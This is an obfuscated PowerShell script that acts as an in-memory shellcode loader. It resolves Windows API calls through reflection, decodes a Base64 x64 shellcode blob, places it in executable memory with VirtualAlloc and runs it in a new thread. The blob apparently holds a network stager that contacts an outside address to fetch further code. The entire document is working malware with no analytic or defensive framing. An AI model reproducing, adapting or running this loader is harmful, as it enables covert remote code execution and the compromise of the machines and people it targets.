function p86 {
	Param ($euJflq58I, $nvbg)		
	$lyqpJmaQTxx = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $lyqpJmaQTxx.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($lyqpJmaQTxx.GetMethod('GetModuleHandle')).Invoke($null, @($euJflq58I)))), $nvbg))
}

function k8y_xuU {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $fICJKr8eV,
		[Parameter(Position = 1)] [Type] $iNXSjbxk9HpQ = [Void]
	)
	
	$irq68h = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$irq68h.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $fICJKr8eV).SetImplementationFlags('Runtime, Managed')
	$irq68h.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $iNXSjbxk9HpQ, $fICJKr8eV).SetImplementationFlags('Runtime, Managed')
	
	return $irq68h.CreateType()
}

[Byte[]]$qJ7hGYLEE = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6A8AAAAyMTIuNTQuMjAxLjE1MgBaSInBScfAuwEAAE0xyVNTagNTSbpXiZ/GAAAAAP/V6AcAAAAvMExVSEMASInBU1pBWE0xyVNIuAAyoIQAAAAAUFNTScfC61UuO//VSInGagpfSInxah9aUmiAMwAASYngagRBWUm6dUaehgAAAAD/1UiJ8VNaTTHATTHJU1NJx8ItBhh7/9WFwHUjSMfBiBMAAEm6RPA14AAAAAD/1Uj/z3QC661Jx8LwtaJW/9VTWWpAWkmJ0cHiEEnHwAAQAABJulikU+UAAAAA/9VIk1NTSInnSInxSInaScfAACAAAEmJ+Um6EpaJ4gAAAAD/1UiDxCCFwHSuZosHSAHDhcB10lhYww==")
		
$aJnN2ps_ohXt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((p86 kernel32.dll VirtualAlloc), (k8y_xuU @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $qJ7hGYLEE.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($qJ7hGYLEE, 0, $aJnN2ps_ohXt, $qJ7hGYLEE.length)

$giLDepQx0 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((p86 kernel32.dll CreateThread), (k8y_xuU @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$aJnN2ps_ohXt,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((p86 kernel32.dll WaitForSingleObject), (k8y_xuU @([IntPtr], [Int32]))).Invoke($giLDepQx0,0xffffffff) | Out-Null